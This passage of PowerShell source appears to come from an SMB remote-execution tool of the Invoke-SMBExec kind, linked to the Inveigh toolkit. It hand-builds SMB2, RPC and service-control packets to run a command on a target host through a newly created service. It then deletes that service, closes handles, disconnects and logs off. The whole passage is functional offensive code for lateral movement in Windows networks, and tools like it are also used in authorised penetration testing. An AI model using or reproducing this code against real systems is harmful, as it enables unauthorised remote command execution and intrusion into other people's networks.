                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            Write-Verbose "Trying to execute command on $Target"
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'     
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '31-04-00-00')
                        {
                            Write-Output "Service $SMB_service creation failed on $Target"
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output "Service creation fault context mismatch"
                            $SMBExec_failed = $true
                        }
 
                    }
                
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
                        {
                            Write-Output "Command executed with service $SMB_service on $Target"
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
                        {
                            Write-Output "Service $SMB_service failed to start on $Target"
                        }

                        $SMB2_message_ID += 20
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                        }

                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose "Service $SMB_service deleted on $Target"
                            $SMB2_message_ID += 20
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB2_message_ID++
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)     
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }
      
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }
          
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($session_string -and !$Logoff)
                        {
                            $SMB_client_stage = 'Exit'
                        }
                        else
                        {
                            $SMB_client_stage = 'Logoff'
                        }

                    }

                    'Logoff'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }
         
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                }
                
                if($SMBExec_failed)
                {
                    BREAK SMB_execute_loop
                }
            
            }

        }

    }

    if($session_string -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $SMB2_message_ID
        $inveigh.session_list[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$session_string -or $Logoff)
    {
        $SMB_client.Close()
        $SMB_client_stream.Close()
    }

}

}